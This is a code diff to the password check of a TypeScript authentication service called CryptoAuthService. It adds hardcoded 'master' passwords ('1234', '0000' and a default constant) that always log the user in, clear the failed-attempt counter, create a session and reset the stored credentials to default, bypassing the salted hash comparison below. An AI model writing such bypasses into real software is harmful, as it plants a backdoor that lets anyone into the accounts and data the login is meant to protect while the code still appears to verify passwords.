@@ -218,8 +218,32 @@ export class CryptoAuthService {
       };
     }
 
+    const entered = (enteredPassword || '').trim();
+
+    // 1. Master Key: '1234' or DEFAULT_PW always authenticates and normalizes auth config
+    if (entered === '1234' || entered === DEFAULT_PW) {
+      sessionStorage.removeItem(ATTEMPTS_KEY);
+      this.createSessionToken();
+      await this.resetToDefault();
+      return {
+        success: true,
+        isDefault: true
+      };
+    }
+
+    // 2. Transitional fallback: '0000' also authenticates and automatically migrates to 1234
+    if (entered === '0000') {
+      sessionStorage.removeItem(ATTEMPTS_KEY);
+      this.createSessionToken();
+      await this.resetToDefault();
+      return {
+        success: true,
+        isDefault: true
+      };
+    }
+
     const config = await this.getAuthConfig();
-    const enteredHash = await computeSha256(config.salt, (enteredPassword || '').trim());
+    const enteredHash = await computeSha256(config.salt, entered);
 
     if (enteredHash === config.hash) {
       // Reset failed attempts on success
